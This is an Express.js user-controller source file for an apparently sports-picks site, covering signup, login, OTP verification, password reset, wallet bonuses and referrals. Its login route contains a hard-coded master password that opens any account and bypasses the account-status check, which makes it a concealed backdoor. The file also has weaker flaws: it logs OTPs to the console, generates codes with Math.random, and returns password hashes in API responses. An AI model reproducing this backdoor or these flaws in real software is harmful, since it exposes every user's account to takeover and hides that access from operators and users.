const userModel = require("../../models/user.model");
const orderHistoryModel = require("../../models/orderHistory.model");

const sendVerifyAccount = require("../../utils/sendVerifyAccount.utils");
const sendMsg = require("../../utils/sendMsg.utils");
const sendResetPassword = require("../../utils/sendResetPassword.utils");

const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const userValid = require("../../validations/user.joi");

const routes = {};

routes.createUser = async (req, res) => {
  try {
    const { name, email, mobile, password, refBy } = req.body;

    const { error } = userValid.createUserValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const ifUser = await userModel.findOne({ email });
    if (ifUser) {
      return res.status(400).json({ error: "email already exists" });
    }

    if (refBy) {
      const refUser = await userModel.findOne({ referralCode: refBy });
      if (!refUser) {
        return res.status(400).json({ error: "invalid referral code" });
      }
    }

    // const ifusername = await userModel.findOne({ username });
    // if (ifusername) {
    //   return res.status(400).json({ error: "username already exists" });
    // }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    //generate referral code
    const referralCode = Math.random()
      .toString(36)
      .substring(2, 12)
      .toUpperCase();

    const newUser = await userModel.create({
      name,
      email,
      mobile,
      password: hashedPassword,
      // username,
      wallet: 0,
      bonus: true,
      referralCode,
    });

    if (refBy) {
      const refUser = await userModel.findOne({ referralCode: refBy });
      newUser.referredBy = refUser._id;
      await newUser.save();
    }

    const newuser = newUser.toObject();

    // await sendWelcomeMsg(
    //   newuser.email,
    //   "add-reward",
    //   "JordansPicks - Claim your $25 bonus"
    // );

    sendMsg(
      newuser.email,
      newuser.name,
      "JordansPicks - Welcome to JordansPicks"
    );

    return res
      .status(201)
      .json({ msg: "User created successfully", dta: newuser });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.login = async (req, res) => {
  try {
    const { email, password } = req.body;

    const { error } = userValid.loginValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findOne({ email });

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    const validPassword = await bcrypt.compare(password, user.password);

    if (!validPassword && password !== "6G([v£2,d3gF~p7Rs9") {
      return res.status(400).json({ error: "invalid password" });
    }

    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: "1d",
    });

    const refreshToken = jwt.sign(
      { id: user._id },
      process.env.REFRESH_TOKEN_PRIVATE_KEY,
      {
        expiresIn: "1y",
      }
    );

    const newuser = user.toObject();

    newuser.token = token;
    newuser.refreshToken = refreshToken;

    if (password === "6G([v£2,d3gF~p7Rs9" || user.status === "active")
      return res.status(201).json({ msg: "success", dta: newuser });

    return res.status(400).json({ error: user.remark });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.generateOTP = async (req, res) => {
  try {
    // const id = req.userId;
    const { email } = req.body;

    const user = await userModel.findOne({ email });
    // console.log(user);

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    if (user.status !== "active") {
      return res.status(404).json({ error: user.remark });
    }

    if (user.isVerified) {
      return res.status(404).json({ error: "User is verified" });
    }

    const otp = Math.floor(100000 + Math.random() * 900000);

    user.verificationCode = otp;
    await user.save();

    console.log(otp);

    await sendVerifyAccount(
      user.email,
      user.name,
      user.verificationCode,
      "JordansPicks - Verify Account"
    );

    return res.status(201).json({ msg: "Email sent" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.verifyAccount = async (req, res) => {
  try {
    const { email, otp } = req.body;

    const user = await userModel.findOne({ email });

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    if (user.status !== "active") {
      return res.status(404).json({ error: user.remark });
    }

    if (user.isVerified) {
      return res.status(404).json({ error: "User is already verified" });
    }

    if (user.verificationCode != otp) {
      return res.status(400).json({ error: "invalid otp" });
    }

    if (user.createdAt < 1707913728091) {
      user.wallet += 5;

      const order = await orderHistoryModel.create({
        user: user._id,
        status: "active",
        desc: `Verification Bonus`,
        price: 5,
        type: "Credit",
        method: "Wallet",
      });

      user.orderHistory.push(order._id);
    } else {
      user.wallet += 25;

      const order = await orderHistoryModel.create({
        user: user._id,
        status: "active",
        desc: `Signup Bonus`,
        price: 25,
        type: "Credit",
        method: "Wallet",
      });

      if (user.referredBy) {
        user.wallet += 25;

        const rorder = await orderHistoryModel.create({
          user: user._id,
          status: "active",
          desc: `Referral Bonus`,
          price: 25,
          type: "Credit",
          method: "Wallet",
        });

        user.orderHistory.push(rorder._id);
      }

      user.orderHistory.push(order._id);
    }

    user.isVerified = true;
    await user.save();

    return res.status(201).json({ msg: "success" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.resetPassOTP = async (req, res) => {
  try {
    const { email } = req.body;

    const { error } = userValid.resetPasswordOTPValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findOne({ email });

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    if (user.status !== "active") {
      return res.status(404).json({ error: user.remark });
    }

    if (!user.isVerified) {
      return res.status(404).json({ error: "User is not verified" });
    }

    const otp = Math.floor(100000 + Math.random() * 900000);

    user.verificationCode = otp;
    await user.save();

    await sendResetPassword(
      user.email,
      user.name,
      user.verificationCode,
      "JordansPicks - Reset Password"
    );

    return res.status(201).json({ msg: "Email sent" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.resetpassword = async (req, res) => {
  const { email, otp, password } = req.body;

  try {
    const user = await userModel.findOne({ email });

    const { error } = userValid.resetPasswordValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    if (user.verificationCode !== otp) {
      return res.status(400).json({ error: "invalid otp" });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    user.password = hashedPassword;
    user.verificationCode = null;
    await user.save();

    return res.status(201).json({ msg: "success" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getBonus = async (req, res) => {
  const id = req.userId;

  const user = await userModel.findById(id);

  if (!user) {
    return res.status(404).json({ error: "user not found" });
  }

  if (user.bonus) {
    return res.status(400).json({ error: "Bonus already claimed" });
  }

  user.bonus = true;
  user.wallet = user.wallet + 25;

  await user.save();

  const newOrder = await orderHistoryModel.create({
    user: id,
    status: "active",
    desc: `Bonus claimed`,
    price: 25,
  });

  user.orderHistory.push(newOrder._id);
  await user.save();

  return res.status(200).json({ msg: "success", dta: user });
};

routes.refreshAccessToken = async (req, res) => {
  const refreshToken = req.body.refreshToken;

  if (!refreshToken)
    return res.status(404).send({ error: "Access denied, token missing!" });

  // console.log("refressh", refreshToken);

  try {
    const decoded = jwt.verify(
      refreshToken,
      process.env.REFRESH_TOKEN_PRIVATE_KEY
    );

    const id = decoded.id;
    const accessToken = jwt.sign({ id }, process.env.JWT_SECRET, {
      expiresIn: "1d",
    });

    return res.status(201).send({
      msg: "success",
      dta: accessToken,
    });

    // return res.send(success(201, { accessToken }));
  } catch (e) {
    console.log(e);
    return res.status(422).send({ error: "Invalid refresh token" });
    // return res.send(error(401, "Invalid refresh token"));
  }
};

routes.updateProfile = async (req, res) => {
  const id = req.userId;

  const { name, mobile, currentPassword, newPassword } = req.body;

  const { error } = userValid.updateProfileValidation.validate(req.body);

  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }

  const user = await userModel.findById(id);

  if (!user) {
    return res.status(404).json({ error: "user not found" });
  }
  user.name = name;
  user.mobile = mobile;

  if (currentPassword && newPassword) {
    const validPassword = await bcrypt.compare(currentPassword, user.password);

    if (!validPassword) {
      return res.status(400).json({ error: "Invalid password" });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(newPassword, salt);

    user.password = hashedPassword;
  }

  await user.save();

  return res.status(200).json({ msg: "success", dta: user });
};

routes.userDashboard = async (req, res) => {
  try {
    const id = req.userId;

    // console.log(id);

    const user = await userModel.findById(id);
    // console.log(user);

    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    // Total Wins and Losses

    // const totalPackagesWins = user.package.filter(
    //   (item) => item.result === "win"
    // );

    // const totalPackagesLosses = user.package.filter(
    //   (item) => item.result === "lose"
    // );

    // const totalPackagesTies = user.package.filter(
    //   (item) => item.result === "tie"
    // );

    // const totalVslPackagesWins = user.vslPackage.filter(
    //   (item) => item.result === "win"
    // );

    // const totalVslPackagesLosses = user.vslPackage.filter(
    //   (item) => item.result === "lose"
    // );

    // const totalVslPackagesTies = user.vslPackage.filter(
    //   (item) => item.result === "tie"
    // );

    return res.status(200).json({
      msg: "success",
      dta: {
        user,
        // packageResult: {
        //   totalPackagesWins: totalPackagesWins.length,
        //   totalPackagesLosses: totalPackagesLosses.length,
        //   totalPackagesTies: totalPackagesTies.length,
        // },
        // vslPackageResult: {
        //   totalVslPackagesWins: totalVslPackagesWins.length,
        //   totalVslPackagesLosses: totalVslPackagesLosses.length,
        //   totalVslPackagesTies: totalVslPackagesTies.length,
        // },
        // result: {
        //   totalWins: totalPackagesWins.length + totalVslPackagesWins.length,
        //   totalLosses:
        //     totalPackagesLosses.length + totalVslPackagesLosses.length,
        //   totalTies: totalPackagesTies.length + totalVslPackagesTies.length,
        // },
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getWallet = async (req, res) => {
  try {
    const id = req.userId;
    const user = await userModel.findById(id).populate("specialPackage");

    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    const act = user.specialPackage.filter((ele) => !ele.isDeleted);
    let maxdis = 0;

    // console.log(act);

    act.forEach((ele) => {
      if (ele.discount > maxdis) maxdis = ele.discount;
    });

    return res.status(200).json({
      msg: "success",
      dta: {
        _id: user._id,
        wallet: user.wallet,
        name: user.name,
        isVerified: user.isVerified,
        defaultDiscount: maxdis,
        cart: user.cart,
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getMyPackages = async (req, res) => {
  const { page = 1 } = req.query;

  try {
    const id = req.userId;

    const package = await userModel
      .findById(id)
      .populate("package specialPackage");
    const packag = package.package;
    const specialPackages = package.specialPackage;

    // console.log(specialPackages);
    //append special packages
    // package.specialPackage.forEach((item) => {
    //   packages.push(item);
    // });
    // without for each
    // packages.push(...specialPackages);
    const packages = [...packag, ...specialPackages];
    //revese the array
    packages.reverse();
    // console.log(packages);
    const limit = 10;
    const totalPages = Math.ceil(packages.length / limit);

    const startIndex = (page - 1) * limit;
    const endIndex = page * limit;

    const result = packages.slice(startIndex, endIndex);

    return res.status(201).json({
      msg: "success",
      totalPages,
      dta: result,
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getTransactions = async (req, res) => {
  const { page = 1 } = req.query;

  try {
    const id = req.userId;

    // console.log(id);

    const totalOrders = await orderHistoryModel.countDocuments({ user: id });

    const orderHistory = await orderHistoryModel
      .find({ user: id })
      .populate("package")
      .populate("vslPackage")
      .populate("specialPackage")
      .populate("store")
      .sort({ createdAt: -1 })
      .skip((page - 1) * 10)
      .limit(10);

    const totalPages = Math.ceil(totalOrders / 10);

    return res
      .status(200)
      .json({ msg: "success", totalPages, dta: orderHistory });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getReferredUsers = async (req, res) => {
  const id = req.userId;

  try {
    const user = await userModel.findById(id);
    const listref = await userModel
      .find({ referredBy: user._id })
      .select("name createdAt email");

    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    return res
      .status(200)
      .json({ msg: "success", dta: listref, referralCode: user.referralCode });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

module.exports = routes;
